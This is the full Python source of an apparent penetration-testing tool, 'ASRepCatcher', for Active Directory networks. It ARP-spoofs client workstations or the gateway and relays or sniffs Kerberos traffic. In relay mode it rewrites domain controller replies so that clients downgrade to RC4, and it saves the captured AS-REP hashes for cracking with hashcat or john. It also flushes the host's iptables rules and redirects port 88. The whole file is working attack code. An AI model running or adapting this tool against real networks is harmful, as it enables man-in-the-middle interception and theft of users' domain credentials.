#!/usr/bin/env python3


# Author : Yassine OUKESSOU




from scapy.all import *
import asn1
import os
import argparse
import time
import threading
import ipaddress
from termcolor import colored
import socket
import asyncio
import logging


decoder = asn1.Decoder()
stop_arp_spoofing_flag = threading.Event()

def print_asrep_hash(username,domain,etype,cipher):
    if HashFormat == 'hashcat':
        if etype == 17 or etype == 18 :
            HashToCrack = f'$krb5asrep${etype}${username}${domain}${cipher[-24:]}${cipher[:-24]}'
        else :
            HashToCrack = f'$krb5asrep${etype}${username}@{domain}:{cipher[:32]}${cipher[32:]}'
    else :
        if etype == 17 or etype == 18 :
            HashToCrack = f'$krb5asrep${etype}${domain}{username}${cipher[:-24]}${cipher[-24:]}'
        else :
            HashToCrack = f'$krb5asrep${username}@{domain}:{cipher[:32]}${cipher[32:]}'
    print(colored(f'[+] Hash to crack : {HashToCrack}', 'green', attrs=['bold']))
    if etype == 17 and HashFormat == 'hashcat' :
        logging.info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/ mode : 32100 ')
    if etype == 18 and HashFormat == 'hashcat' :
        logging.info('You will need to download hashcat beta version to crack it : https://hashcat.net/beta/ mode : 32200 ')
    with open(outfile, 'a') as f:
        f.write(HashToCrack + '\n')

def handle_as_rep(packet):
    decoder.start(bytes(packet.root.cname.nameString[0]))
    username = decoder.read()[1].decode().lower()
    decoder.start(bytes(packet.root.crealm))
    domain = decoder.read()[1].decode().lower()
    logging.info(f'[+] Got ASREP for username : {username}@{domain}')
    decoder.start(bytes(packet.root.encPart.etype))
    etype = decoder.read()[1]
    decoder.start(bytes(packet.root.encPart.cipher))
    cipher = decoder.read()[1].hex()
    if username in UsernamesCaptured and etype in UsernamesCaptured[username] :
        logging.info(f'[*] Hash already captured for {username} and {etype} encryption type, skipping...')
        return
    else :
        if username in UsernamesCaptured :
            UsernamesCaptured[username].append(etype)
        else :
            UsernamesCaptured[username] = [etype]
    print_asrep_hash(username, domain, etype, cipher)

def parse_dc_response(packet):
    if packet.haslayer(KRB_TGS_REP):
        decoder.start(bytes(packet.root.cname.nameString[0]))
        username = decoder.read()[1].decode().lower()
        decoder.start(bytes(packet.root.crealm))
        domain = decoder.read()[1].decode().lower()
        if username not in UsernamesSeen and username not in UsernamesCaptured :
            if username.endswith('$'):
                logging.debug(f'[+] Sniffed TGS-REP for user {username}@{domain}')
            else :
                logging.info(f'[+] Sniffed TGS-REP for user {username}@{domain}')
            UsernamesSeen.add(username)
            return
    if not packet.haslayer(KRB_AS_REP):
        return
    decoder.start(bytes(packet.root.cname.nameString[0]))
    username = decoder.read()[1].decode().lower()
    decoder.start(bytes(packet.root.crealm))
    domain = decoder.read()[1].decode().lower()
    logging.info(f'[+] Got ASREP for username : {username}@{domain}')
    if username.endswith('$') :
        logging.info(f'[*] Machine account : {username}, skipping...')
        return
    decoder.start(bytes(packet.root.encPart.etype))
    etype = decoder.read()[1]
    decoder.start(bytes(packet.root.encPart.cipher))
    cipher = decoder.read()[1].hex()
    if username in UsernamesCaptured and etype in UsernamesCaptured[username] :
        logging.info(f'[*] Hash already captured for {username} and {etype} encryption type, skipping...')
        return
    else :
        if username in UsernamesCaptured :
            UsernamesCaptured[username].append(etype)
        else :
            UsernamesCaptured[username] = [etype]
    print_asrep_hash(username,domain,etype,cipher)
    if mode == 'listen' and not keep_spoofing and not disable_spoofing :
        Targets.remove(packet[IP].dst)
        restore(gw,packet[IP].dst)
        logging.info(f'[+] Restored arp cache of {packet[IP].dst}')



def listen_mode():
    try :
        sniff(filter=f"src port 88", prn=parse_dc_response)
    except KeyboardInterrupt :
        pass
    except Exception as e :
        logging.error(f'[-] Got error : {e}')
    finally :
        print('\n')
        if not disable_spoofing :
            stop_arp_spoofing_flag.set()
            logging.info('[*] Restoring arp cache of the gateway, please hold...')
            restore_all_targets()
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        logging.info('[*] Disabled IPV4 forwarding')



def restore(poisoned_device, spoofed_ip):
    packet = ARP(op = 2, pdst = poisoned_device, psrc = spoofed_ip, hwsrc = getmacbyip(spoofed_ip)) 
    send(packet, verbose = False, count=1)

def restore_listenmode(dic_mac_addresses):
    del dic_mac_addresses[gw]
    for ip_address in dic_mac_addresses :
        packet = ARP(op = 2, pdst = gw, psrc = ip_address, hwsrc = dic_mac_addresses[ip_address]) 
        send(packet, verbose = False, count=1)


def update_uphosts():
    mac_addresses = get_all_mac_addresses()
    new_hosts = set(mac_addresses.keys()) - {gw, my_ip} - Targets
    old_hosts = Targets - set(mac_addresses.keys())
    logging.debug(f'[*] Net probe check, removing down hosts from targets : {list(old_hosts)}')
    if keep_spoofing : 
        Targets.update(new_hosts)
        logging.debug(f'[*] Net probe check, adding new hosts to targets : {list(new_hosts)}')
    Targets.difference_update(old_hosts)
    logging.debug(f'[*] Net probe check, updated targets list : {list(Targets)}')


def relaymode_arp_spoof(spoofed_ip):
    timer = 0
    while not stop_arp_spoofing_flag.is_set() and Targets != set():
        send(ARP(op = 2, pdst = list(Targets), psrc = spoofed_ip), verbose = False)
        time.sleep(1)
        timer += 1
        if timer == 3 :
            update_uphosts()
            timer = 0

def listenmode_arp_spoof():
    while not stop_arp_spoofing_flag.is_set() and Targets != set():
        send(ARP(op = 2, pdst = gw, psrc = list(Targets)), verbose = False)
        time.sleep(1)


def get_all_mac_addresses():
    mac_addresses = {}
    ip_with_mask = os.popen("ip -o -4 a show dev "+ conf.iface +" | awk '{print $4}'").read().strip()
    subnet = ipaddress.ip_network(ip_with_mask, strict=False)
    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(subnet)),timeout=0.5,verbose=False)
    for i in ans :
        mac_addresses[i[1].psrc] = i[1].hwsrc
    return(mac_addresses)



def restore_all_targets():
    if mode == 'relay':
        for target in Targets :
            restore(target,gw)
    elif mode == 'listen':
        restore_listenmode(get_all_mac_addresses())


def is_valid_ip_list(iplist):
    if not re.match(r'^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?),)*((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$', iplist) :
        return False
    return True

def is_valid_ipwithmask(ip_with_mask):
    if not re.match(r'^([01]?\d\d?|2[0-4]\d|25[0-5])(?:\.(?:[01]?\d\d?|2[0-4]\d|25[0-5])){3}(?:/[0-2]\d|/3[0-2])?$', ip_with_mask):
        return False
    return True



async def handle_client(reader, writer):
    client_ip = writer.get_extra_info('peername')[0]
    logging.debug(f"[+] Connection from {client_ip}")

    try:
        while True:
            data = await reader.read(2048)
            if not data:
                break

            dc_response = await relay_to_dc(data, client_ip)
            writer.write(dc_response)
            await writer.drain()

    except Exception as e:
        logging.error(f'[!] Socket error: {e}')

    finally:
        writer.close()

async def relay_without_modification_to_dc(data):
    reader, writer = await asyncio.open_connection(dc,88)
    writer.write(data)
    await writer.drain()
    response = await reader.read(2048)
    writer.close()
    await writer.wait_closed()
    return response

async def relay_tgsreq_to_dc(data):
    response = await relay_without_modification_to_dc(data)
    kerberos_packet = KerberosTCPHeader(response)
    if not kerberos_packet.haslayer(KRB_TGS_REP):
        return response
    decoder.start(bytes(kerberos_packet.root.cname.nameString[0]))
    username = decoder.read()[1].decode().lower()
    decoder.start(bytes(kerberos_packet.root.crealm))
    domain = decoder.read()[1].decode().lower()
    if username not in UsernamesSeen and username not in UsernamesCaptured :
        if username.endswith('$') :
            logging.debug(f'[+] Sniffed TGS-REP for user {username}@{domain}')
        else :
            logging.info(f'[+] Sniffed TGS-REP for user {username}@{domain}')
        UsernamesSeen.add(username)
        return response
    return response

async def relay_asreq_to_dc(data, client_ip):
    kerberos_packet = KerberosTCPHeader(data)
    decoder.start(bytes(kerberos_packet.root.reqBody.cname.nameString[0]))
    username = decoder.read()[1].decode().lower()
    decoder.start(bytes(kerberos_packet.root.reqBody.realm))
    domain = decoder.read()[1].decode().lower()

    if username.endswith('$') :
        logging.debug(f'[*] AS-REQ coming for computer account {username}@{domain}. Relaying...')
        return await relay_without_modification_to_dc(data)

    if username in UsernamesCaptured and 23 in UsernamesCaptured[username] :
        logging.info(f'[*] RC4 hash already captured for {username}@{domain}. Relaying...')
        return await relay_without_modification_to_dc(data)

    if len(kerberos_packet.root.padata) != 2 :
        if ASN1_INTEGER(23) not in kerberos_packet.root.reqBody.etype :
            logging.warning(f'[-] AS-REQ coming from {client_ip} for {username}@{domain} : RC4 not supported by the client. RC4 may disabled on client workstations...')
            return await relay_without_modification_to_dc(data)
        logging.info(f'[+] AS-REQ coming from {client_ip} for {username}@{domain}')
        response = await relay_without_modification_to_dc(data)
        krb_response = KerberosTCPHeader(response)
        if not (krb_response.haslayer(KRB_ERROR) and krb_response.root.errorCode == 0x19) :
            return response
        RC4_present = False
        indexes_to_delete = []
        for idx, x in enumerate(krb_response.root.eData[0].seq[0].padataValue.seq) :
            if x.etype == 0x17 :
                RC4_present = True
            else :
                indexes_to_delete.append(idx)
        if not RC4_present :
            logging.warning("[!] RC4 not found in DC's supported algorithms. Downgrade to RC4 will not work")
            return response
        logging.info(f'[+] Hijacking Kerberos encryption negotiation for {username}@{domain}...')
        for i in indexes_to_delete :
            del krb_response.root.eData[0].seq[0].padataValue.seq[i]
        krb_response[KerberosTCPHeader].len = len(bytes(krb_response[Kerberos])) 
        return bytes(krb_response[KerberosTCPHeader])
    
    response = await relay_without_modification_to_dc(data)
    krb_response = KerberosTCPHeader(response)
    if krb_response.haslayer(KRB_AS_REP):
        handle_as_rep(krb_response)
        if not keep_spoofing and not disable_spoofing :
            if client_ip in Targets : Targets.remove(client_ip)
            restore(client_ip, gw)
            logging.info(f'[+] Restored arp cache of {client_ip}')
        return response
    return response

         

    
async def relay_to_dc(data, client_ip):
    kerberos_packet = KerberosTCPHeader(data)

    if kerberos_packet.haslayer(KRB_TGS_REQ):
        return await relay_tgsreq_to_dc(data)
   
    if kerberos_packet.haslayer(KRB_AS_REQ):
        return await relay_asreq_to_dc(data, client_ip)
    
    return await relay_without_modification_to_dc(data)

async def kerberos_server():
    try :
        os.system("iptables-save > /tmp/asrepcatcher_rules.v4")
    except Exception as e :
        logging.error(f'[!] Could not back up iptables : {e}')
        sys.exit(1)
    os.system('''sudo iptables -F
                sudo iptables -X
                sudo iptables -t nat -F
                sudo iptables -t nat -X
                sudo iptables -t mangle -F
                sudo iptables -t mangle -X
                sudo iptables -P INPUT ACCEPT
                sudo iptables -P OUTPUT ACCEPT
                sudo iptables -P FORWARD ACCEPT''')
    logging.debug('[*] Saved current iptables\n\n')
    os.system(f'iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 88 -j DNAT --to 127.0.0.1:88')
    os.system(f'sysctl -w net.ipv4.conf.{iface}.route_localnet=1 1>/dev/null')
    print('\n')
    
    server = await asyncio.start_server(handle_client, '0.0.0.0', 88)

    async with server:
        await server.serve_forever()


def relay_mode() :
    try:
        asyncio.run(kerberos_server())
    except KeyboardInterrupt:
        pass
    finally :
        print('\n')
        if not disable_spoofing:
            stop_arp_spoofing_flag.set()
            logging.info(f'[*] Restoring arp cache of {len(Targets)} poisoned targets, please hold...')
            restore_all_targets()
        os.system("iptables-restore < /tmp/asrepcatcher_rules.v4")
        logging.info("[*] Restored iptables")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        logging.info('[*] Disabled IPV4 forwarding')
        os.system(f'sysctl -w net.ipv4.conf.{iface}.route_localnet=0 1>/dev/null')



def main():
    if mode == 'relay' :
        relay_mode()
    else :
        listen_mode()



def display_banner():
    print("""            _____ _____             _____      _       _               
     /\    / ____|  __ \           / ____|    | |     | |              
    /  \  | (___ | |__) |___ _ __ | |     __ _| |_ ___| |__   ___ _ __ 
   / /\ \  \___ \|  _  // _ \ '_ \| |    / _` | __/ __| '_ \ / _ \ '__|
  / ____ \ ____) | | \ \  __/ |_) | |___| (_| | || (__| | | |  __/ |   
 /_/    \_\_____/|_|  \_\___| .__/ \_____\__,_|\__\___|_| |_|\___|_|   
                            | |                                        
                            |_|                                          - by Yassine OUKESSOU


                            """)

if __name__ == '__main__':
    if os.geteuid() != 0 :
        logging.error("Please run as root")
        sys.exit(1)

    parser = argparse.ArgumentParser(add_help = True, description = "Catches Kerberos AS-REP packets and outputs it to a crackable format", formatter_class=argparse.RawTextHelpFormatter)

    parser.add_argument('mode', choices=['relay', 'listen'], action='store', help="Relay mode  : AS-REQ requests are relayed to capture AS-REP. Force clients to use RC4 if supported.\n"
                                                                                    "Listen mode : AS-REP packets going to clients are sniffed. No alteration of packets is performed.")
    parser.add_argument('-outfile', action='store', help='Output filename to write hashes to crack.')
    parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat', help='Format to save the AS_REP hashes. Default is hashcat.')
    parser.add_argument('-debug', action='store_true', default=False, help='Increase verbosity')

    group = parser.add_argument_group('ARP poisoning')

    group.add_argument('-t', action='store', metavar = "Client workstations", help='Comma separated list of client computers IP addresses or subnet (IP/mask). In relay mode they will be poisoned. In listen mode, the AS-REP directed to them are captured. Default is whole subnet.')
    group.add_argument('-tf', action='store', metavar = "targets file", help='File containing client workstations IP addresses.')
    group.add_argument('-gw', action='store', metavar = "Gateway IP", help='Gateway IP. More generally, the IP from which the AS-REP will be coming from. If DC is in the same VLAN, then specify the DC\'s IP. In listen mode, only this IP\'s ARP cache is poisoned. Default is default interface\'s gateway.')
    parser.add_argument('-dc', action='store', metavar = "DC IP", help='Domain controller\'s IP.')
    parser.add_argument('-iface', action='store', metavar = "interface", help='Interface to use. Uses default interface if not specified.')
    group.add_argument('--keep-spoofing', action='store_true', default=False, help='Keeps poisoning the targets after capturing AS-REP packets. False by default.')
    group.add_argument('--disable-spoofing', action='store_true', default=False, help='Disables arp spoofing, the MitM position is attained by the attacker using their own method. False by default : the tool uses its own arp spoofing method.')

    if len(sys.argv)==1:
        display_banner()
        parser.print_help()
        sys.exit(1)

    display_banner()
    parameters = parser.parse_args()
    if parameters.keep_spoofing == True and parameters.disable_spoofing == True :
        logging.error('[!] Cannot use --keep-spoofing and --disable-spoofing at the same time')
        sys.exit(1)



    if parameters.t is not None and parameters.tf is not None :
        logging.error('[!] Cannot use -t and -tf simultaneously')
        sys.exit(1)


    mode = parameters.mode
    outfile = parameters.outfile if parameters.outfile is not None else 'asrep_hashes.txt'
    HashFormat = parameters.format
    iface = parameters.iface if parameters.iface is not None else conf.iface
    keep_spoofing = parameters.keep_spoofing
    disable_spoofing = parameters.disable_spoofing
    gw = parameters.gw if parameters.gw is not None else conf.route.route("0.0.0.0")[2]
    dc = parameters.dc
    debug = parameters.debug

    if debug :
        logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.DEBUG)
    else :
        logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO)

    if parameters.mode == 'relay' and parameters.dc is None :
        logging.error('[!] Must specify DC IP in relay mode. Quitting...')
        sys.exit(1)

    if not disable_spoofing :
        if parameters.iface is None :
            logging.warning(f'[*] No interface specified, will use the default interface : {iface}')
        else :
            if parameters.iface not in get_if_list():
                logging.error(f'[!] Interface {parameters.iface} was not found. Quitting...')
                sys.exit(1)
        if parameters.gw is None :
            logging.info(f'[*] No gateway specified, will use the default gateway of {iface} : {gw}')
        logging.info(f'[*] Gateway IP : {gw}')




    UsernamesCaptured = {}
    UsernamesSeen = set()
    HashesCaptured = set()
    logging.info(f'[*] Interface : {iface}')
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    logging.debug('[*] Enabled IPV4 forwarding')

    if not disable_spoofing :
        if parameters.t is not None :
            if is_valid_ip_list(parameters.t.replace(' ','')) :
                TargetsList = parameters.t.replace(' ','').split(',')
            elif is_valid_ipwithmask(parameters.t) :
                subnet = ipaddress.ip_network(parameters.t, strict=False)
                TargetsList = [str(ip) for ip in subnet.hosts()]
            else :
                logging.error('[!] IP list in a bad format, expected format : 192.168.1.2,192.168.1.3,192.168.1.5 OR 192.168.1.0/24')
                sys.exit(1)
        elif parameters.tf is not None :
            try :
                with open(parameters.tf, 'r') as f:
                    iplist = f.read().strip().replace('\n',',')
            except Exception as e :
                logging.error(f'[-] Could not open file : {e}')
                sys.exit(1)
            if not is_valid_ip_list(iplist) :
                logging.error('[!] IP list in a bad format')
                sys.exit(1)
            TargetsList = iplist.split(',')
        else :
            ip_with_mask = os.popen("ip -o -4 a show dev "+ conf.iface +" | awk '{print $4}'").read().strip()
            subnet = ipaddress.ip_network(ip_with_mask, strict=False)
            TargetsList = [str(ip) for ip in subnet.hosts()]
            TargetsList.remove(gw)
            logging.info(f'[*] Targets not supplied, will use local subnet {subnet} minus the gateway')

        if gw in TargetsList and (parameters.t is not None or parameters.tf is not None) :
            logging.info('[*] Found gateway in targets list. Removing it')
            TargetsList.remove(gw)

        logging.debug(f'[*] Scanning {iface} subnet')
        mac_addresses = get_all_mac_addresses()

        if gw not in mac_addresses :
            logging.error('[-] Gateway did not respond to ARP. Quitting...')
            sys.exit(1)

        Targets = set(TargetsList)

        my_ip = get_if_addr(conf.iface)
        if my_ip in Targets :
            Targets.remove(my_ip)

        if parameters.mode == 'listen':
            thread = threading.Thread(target=listenmode_arp_spoof)
            thread.start()
            logging.info('[+] ARP poisoning the gateway')
        elif parameters.mode == 'relay' :
            Targets = Targets - (Targets - set(mac_addresses.keys()))
            if Targets == set() :
                logging.error('[-] No target responded to ARP. Quitting...')
                sys.exit(1)
            thread = threading.Thread(target=relaymode_arp_spoof, args=(gw,))
            thread.start()
            logging.info('[+] ARP poisoning the client workstations')
        logging.debug(f'[*] Net probe check, targets list : {list(Targets)}')
    else :
        logging.warning(f'[!] ARP spoofing disabled')

    main()
